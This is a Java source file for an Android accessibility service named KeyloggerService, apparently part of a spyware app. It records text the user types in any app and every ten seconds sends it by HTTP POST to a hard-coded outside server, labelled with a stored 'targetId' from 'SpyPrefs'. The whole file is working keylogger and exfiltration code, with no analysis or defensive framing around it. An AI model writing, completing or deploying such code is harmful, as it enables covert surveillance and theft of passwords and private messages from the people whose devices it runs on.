package com.nullx.pp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "CRPT.Keylogger";
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/post-response/";
    private StringBuilder keyBuffer = new StringBuilder();
    private long lastSendTime = 0;
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && !event.getText().isEmpty()) {
                String text = event.getText().toString();
                keyBuffer.append(text).append(" ");
                
                long now = System.currentTimeMillis();
                if (now - lastSendTime > 10000 && keyBuffer.length() > 0) {
                    sendKeylog();
                    lastSendTime = now;
                }
            }
        }
    }
    
    private void sendKeylog() {
        final String keys = keyBuffer.toString();
        keyBuffer.setLength(0);
        
        new Thread(() -> {
            try {
                String targetId = getSharedPreferences("SpyPrefs", MODE_PRIVATE).getString("targetId", "unknown");
                URL url = new URL(SERVER_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject payload = new JSONObject();
                payload.put("cmd", "keylog_data");
                payload.put("data", keys);
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending keylog: " + e.getMessage());
            }
        }).start();
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted");
    }
    
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | 
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
    }
}